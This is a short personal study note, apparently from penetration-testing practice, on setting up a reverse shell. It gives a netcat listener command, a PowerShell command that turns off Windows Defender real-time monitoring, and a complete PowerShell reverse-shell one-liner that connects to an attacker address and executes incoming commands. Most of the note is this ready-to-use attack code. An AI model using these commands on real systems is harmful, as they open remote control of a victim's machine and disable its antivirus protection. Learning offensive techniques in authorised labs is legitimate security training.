`reverse shell`, the attack box will have a listener running, and the target will need to initiate the connection
![[shell and payload/image.png|542x314]]

<span style="color:rgb(0, 176, 80)">server</span> --> attacker
<span style="color:rgb(0, 176, 80)">client</span> --> target

[cheat sheet of reverse shell ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

#### Server
```bash
sudo nc -lnpn 443
```
we need to try to use common port because not mush filters will block

#### client
windows will not have the netcat installed so we need to use manually
- this is shell code
- some times we dont have permission to do this or some time AD will block running this so we can disable the AD
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```


```powershell 
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
